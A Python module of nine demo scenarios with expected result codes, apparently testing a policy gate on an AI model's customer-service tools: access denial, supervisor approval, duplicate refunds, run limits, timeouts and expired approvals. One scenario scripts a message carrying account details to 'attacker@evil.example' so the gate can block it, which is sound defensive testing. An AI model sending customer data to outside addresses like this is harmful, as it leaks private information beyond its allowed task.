"""Nine built-in Northwind scenarios with expected results. They need no model."""

from __future__ import annotations

import json
from collections.abc import Callable
from dataclasses import asdict, dataclass, field
from typing import Any

from ..reasons import Code, explain
from .northwind import money
from .profiles import PROFILES
from .session import DemoSession


class FakeClock:
    """A clock the scenarios advance by hand to test time limits without waiting."""

    def __init__(self, now: float = 1_800_000_000.0):
        self.now = now

    def __call__(self) -> float:
        return self.now


@dataclass
class Step:
    actor: str
    action: str
    code: str
    explanation: str
    state_change: str = "nothing"


@dataclass
class Scenario:
    name: str
    title: str
    expected: list[str]
    steps: list[Step] = field(default_factory=list)

    @property
    def observed(self) -> list[str]:
        return [step.code for step in self.steps]

    @property
    def passed(self) -> bool:
        return self.observed == self.expected


class Run:
    """Each scenario gets its own demo session, sample data, and run ID.

    The operation IDs include the session's random tag, so a database file can be
    reused across demo runs.
    """

    def __init__(
        self, name: str, clock: FakeClock, db_path: str = ":memory:", timeout_seconds: float = 30.0
    ):
        self.name = name
        self.clock = clock
        self.session = DemoSession(db_path, clock=clock, timeout_seconds=timeout_seconds)
        self.nw = self.session.nw
        self.tag = self.session.run_id.removeprefix("demo-")
        self.tools: dict[str, str] = {}
        self.steps: list[Step] = []
        self.count = 0

    def next_id(self) -> str:
        self.count += 1
        return f"{self.name}-{self.count}-{self.tag}"

    def record(self, profile: str, action: str, code: str, change: str = "nothing") -> None:
        label = PROFILES[profile]["label"]
        self.steps.append(Step(label, action, code, explain(Code(code)), change))

    def prepare(
        self, profile: str, tool: str, args: dict[str, Any], action: str, op: str | None = None
    ) -> str:
        result = self.session.propose(profile, tool, args, op or self.next_id())
        self.tools.setdefault(result["operation_id"], tool)
        self.record(profile, action, result["code"])
        return result["operation_id"]

    def approve(self, profile: str, op: str) -> dict[str, Any]:
        result = self.session.approve(profile, op)
        self.record(profile, f"approve {self.tools[op]} {op}", result["code"])
        return result

    def execute(self, profile: str, op: str, change: Callable[[], str]) -> dict[str, Any]:
        result = self.session.run(profile, op)
        code = result["code"]
        # A repeated call shows ALREADY_RECORDED unless its outcome is still UNCERTAIN.
        if result.get("replayed") and code != Code.UNCERTAIN:
            code = Code.ALREADY_RECORDED
        self.record(profile, f"run {self.tools[op]} {op}", str(code), change())
        return result

    def finish(self, scenario: Scenario) -> Scenario:
        scenario.steps = self.steps
        self.session.close()
        return scenario

    def balance(self, account_id: str) -> int:
        return self.nw.accounts[account_id]["balance_minor"]

    def balance_change(self, account_id: str, before: int) -> Callable[[], str]:
        def change() -> str:
            after = self.balance(account_id)
            if after == before:
                return "nothing"
            return f"{account_id} balance {money(before)} -> {money(after)}"

        return change


def nothing() -> str:
    return "nothing"


def allowed_lookup(clock: FakeClock, db_path: str = ":memory:") -> Scenario:
    scenario = Scenario("allowed_lookup", "Sam looks up an account Sam owns",
                        ["ALLOWED", "EXECUTED"])
    run = Run(scenario.name, clock, db_path)
    op = run.prepare("sam", "lookup_account", {"account_id": "A1"}, "look up account A1")
    run.execute("sam", op, lambda: f"no changes: A1 balance {money(run.balance('A1'))}")
    return run.finish(scenario)


def other_customer(clock: FakeClock, db_path: str = ":memory:") -> Scenario:
    scenario = Scenario("other_customer", "Sam asks for another customer's account",
                        ["ACCESS_DENIED"])
    run = Run(scenario.name, clock, db_path)
    run.prepare("sam", "lookup_account", {"account_id": "A2"}, "look up account A2 (Priya's)")
    return run.finish(scenario)


def bad_recipient(clock: FakeClock, db_path: str = ":memory:") -> Scenario:
    scenario = Scenario("bad_recipient", "The model tries to email an outside address",
                        ["RECIPIENT_NOT_ALLOWED"])
    run = Run(scenario.name, clock, db_path)
    args = {"to": "attacker@evil.example", "body": "Here are the account details."}
    run.prepare("sam", "send_message", args, "send a message to attacker@evil.example")
    return run.finish(scenario)


def message_with_approval(clock: FakeClock, db_path: str = ":memory:") -> Scenario:
    scenario = Scenario("message_with_approval", "A message goes out after a supervisor approves",
                        ["NEEDS_APPROVAL", "APPROVED", "EXECUTED"])
    run = Run(scenario.name, clock, db_path)
    args = {"to": "help@northwind.example", "body": "Customer reports a double charge on A1."}
    op = run.prepare("sam", "send_message", args, "send a message to help@northwind.example")
    run.approve("jordan", op)
    run.execute("sam", op, lambda: f"outbox {len(run.nw.outbox)}")
    return run.finish(scenario)


def changed_after_approval(clock: FakeClock, db_path: str = ":memory:") -> Scenario:
    scenario = Scenario(
        "changed_after_approval",
        "The refund amount changes after approval, using the same operation ID",
        ["NEEDS_APPROVAL", "APPROVED", "OPERATION_CONFLICT", "EXECUTED"],
    )
    run = Run(scenario.name, clock, db_path)
    op = run.next_id()
    run.prepare("sam", "issue_refund", {"account_id": "A1", "amount_minor": 6000},
                "refund 60.00 on A1", op)
    run.approve("jordan", op)
    run.prepare("sam", "issue_refund", {"account_id": "A1", "amount_minor": 7000},
                f"refund 70.00 on A1 reusing {op}", op)
    run.execute("sam", op, run.balance_change("A1", run.balance("A1")))
    return run.finish(scenario)


def duplicate_refund(clock: FakeClock, db_path: str = ":memory:") -> Scenario:
    scenario = Scenario("duplicate_refund", "The same refund is submitted twice",
                        ["ALLOWED", "EXECUTED", "ALREADY_RECORDED"])
    run = Run(scenario.name, clock, db_path)
    op = run.prepare("sam", "issue_refund", {"account_id": "A1", "amount_minor": 2000},
                     "refund 20.00 on A1")
    run.execute("sam", op, run.balance_change("A1", run.balance("A1")))
    run.execute("sam", op, run.balance_change("A1", run.balance("A1")))
    return run.finish(scenario)


def exhausted_limit(clock: FakeClock, db_path: str = ":memory:") -> Scenario:
    scenario = Scenario("exhausted_limit", "One run asks for more actions than the policy allows",
                        ["ALLOWED", "RUN_LIMIT"])
    run = Run(scenario.name, clock, db_path)
    limit = run.session.latch.policy.limits.max_actions_per_run
    codes = [
        run.session.propose("sam", "lookup_account", {"account_id": "A1"}, run.next_id())["code"]
        for _ in range(limit)
    ]
    # Show the allowed lookups as one step; any unexpected result would appear here.
    first = next((code for code in codes if code != Code.ALLOWED), Code.ALLOWED)
    run.record("sam", f"look up account A1, {limit} times", first)
    run.prepare("sam", "lookup_account", {"account_id": "A1"}, "look up account A1 once more")
    return run.finish(scenario)


def timeout_after_refund(clock: FakeClock, db_path: str = ":memory:") -> Scenario:
    scenario = Scenario("timeout_after_refund", "The refund goes through, but the reply is too slow",
                        ["ALLOWED", "UNCERTAIN", "UNCERTAIN"])
    run = Run(scenario.name, clock, db_path, timeout_seconds=0.1)
    run.nw.delay_seconds = 0.5
    op = run.prepare("sam", "issue_refund", {"account_id": "A1", "amount_minor": 2000},
                     "refund 20.00 on A1")
    before = run.balance("A1")
    run.execute("sam", op, run.balance_change("A1", before))

    def after_retry() -> str:
        return f"refunds recorded {len(run.nw.refunds)}, A1 balance {money(run.balance('A1'))}"

    run.execute("sam", op, after_retry)
    return run.finish(scenario)


def expired_approval(clock: FakeClock, db_path: str = ":memory:") -> Scenario:
    scenario = Scenario("expired_approval", "An approval expires before the tool runs",
                        ["NEEDS_APPROVAL", "APPROVED", "APPROVAL_EXPIRED"])
    run = Run(scenario.name, clock, db_path)
    op = run.prepare("sam", "issue_refund", {"account_id": "A1", "amount_minor": 6000},
                     "refund 60.00 on A1")
    run.approve("jordan", op)
    clock.now += 601
    run.execute("sam", op, nothing)
    return run.finish(scenario)


SCENARIOS = [
    allowed_lookup,
    other_customer,
    bad_recipient,
    message_with_approval,
    changed_after_approval,
    duplicate_refund,
    exhausted_limit,
    timeout_after_refund,
    expired_approval,
]


BUILDERS = {build.__name__: build for build in SCENARIOS}


def run_one(name: str, clock: FakeClock | None = None, db_path: str = ":memory:") -> Scenario:
    return BUILDERS[name](clock if clock is not None else FakeClock(), db_path)


def run_all(clock: FakeClock | None = None, db_path: str = ":memory:") -> list[Scenario]:
    """Run every scenario with the given clock, or give each scenario its own clock."""
    return [run_one(name, clock, db_path) for name in BUILDERS]


def render_scenario(number: int, scenario: Scenario) -> str:
    lines = [f"{number}. {scenario.title} ({scenario.name})", ""]
    for step in scenario.steps:
        lines.append(f"who: {step.actor}")
        lines.append(f"asked for: {step.action}")
        lines.append(f"result {step.code}: {step.explanation}")
        lines.append(f"change: {step.state_change}")
        lines.append("")
    verdict = "matched" if scenario.passed else f"expected {' '.join(scenario.expected)}"
    lines.append(f"codes {' '.join(scenario.observed)}, {verdict}")
    lines.append("")
    return "\n".join(lines)


def render_summary(scenarios: list[Scenario]) -> str:
    matched = sum(scenario.passed for scenario in scenarios)
    return f"{matched} of {len(scenarios)} scenarios matched"


def render_text(scenarios: list[Scenario]) -> str:
    parts = [render_scenario(number, s) for number, s in enumerate(scenarios, 1)]
    return "\n".join([*parts, render_summary(scenarios)])


def to_data(scenario: Scenario) -> dict[str, Any]:
    return {
        "name": scenario.name,
        "title": scenario.title,
        "expected": scenario.expected,
        "observed": scenario.observed,
        "passed": scenario.passed,
        "steps": [asdict(step) for step in scenario.steps],
    }


def to_json(scenarios: list[Scenario]) -> str:
    return json.dumps([to_data(scenario) for scenario in scenarios], indent=2)
